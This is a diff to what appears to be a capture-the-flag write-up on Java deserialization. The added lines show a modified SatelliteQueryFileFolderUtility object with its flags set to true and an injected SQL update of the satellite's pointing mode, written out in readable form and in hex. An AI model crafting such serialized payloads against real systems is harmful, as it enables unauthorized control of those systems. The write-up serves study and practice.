@@ -80,6 +80,23 @@ So this is a serialization of an object of class  "SatelliteQueryFileFolderUtili
 We can see, that "isQuery" and "isUpdate" are both "false" and "pathOrStatement" contains "/opt/SatelliteQueryFileFolderUtility.java".
 
 Following the source code, the two booleans can be set to "true" and the string to "update pointing_mode set numerical_mode=1" on order to modify the pointing mode:
+Modification of the above:
+```
+SatelliteQueryFileFolderUtility
+        values
+          isQuery
+            (boolean)true - 0x01
+          isUpdate
+            (boolean)true - 0x01
+          pathOrStatement
+            (object)
+              TC_STRING - 0x74
+                newHandle 0x00 7e 00 03
+                Length - 41 - 0x00 29
+                Value - update pointing_mode set numerical_mode=1 - 0x75706461746520706f696e74696e675f6d6f646520736574206e756d65726963616c5f6d6f64653d31
+```
+
+Full serialized object (readable):
 ```
 STREAM_MAGIC - 0xac ed
 STREAM_VERSION - 0x00 05
@@ -304,6 +321,6 @@ public class SatelliteQueryFileFolderUtility implements Serializable {
 
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTM1OTk0ODA5MywtNTEwMjczMjY4LC00Nj
-YyNDIzMjEsLTIwMTAxOTI2M119
+eyJoaXN0b3J5IjpbLTQzNDQ1NjU1MywxMzU5OTQ4MDkzLC01MT
+AyNzMyNjgsLTQ2NjI0MjMyMSwtMjAxMDE5MjYzXX0=
 -->
